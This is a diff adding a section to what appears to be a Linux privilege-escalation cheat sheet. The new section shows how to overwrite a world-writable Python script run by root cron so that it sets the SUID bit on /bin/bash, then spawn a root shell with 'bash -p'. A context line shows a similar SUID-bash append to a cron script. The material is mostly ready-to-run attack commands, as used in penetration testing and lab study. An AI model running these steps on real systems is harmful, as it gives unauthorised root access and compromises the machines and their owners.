@@ -1557,6 +1557,31 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
 id
 ```
 
+For a writable Python script run by root cron, replace the script with a Python SUID Bash payload:
+
+```bash
+cat /etc/crontab
+# */3 * * * * root python /var/www/html/booked/cleanup.py
+
+ls -la /var/www/html/booked/cleanup.py
+# -rwxrwxrwx 1 www-data www-data ... /var/www/html/booked/cleanup.py
+
+cat > /var/www/html/booked/cleanup.py << 'EOF'
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('chmod +s /bin/bash')
+except:
+        print 'ERROR...'
+sys.exit(0)
+EOF
+
+# Wait for cron, then:
+/bin/bash -p
+id
+```
+
 #### Cron script owned by low-priv user but run as root
 
 Do not only look for world-writable cron scripts. If a root cron job runs a script owned by your current user, you can append a root action even when the file is not world-writable.
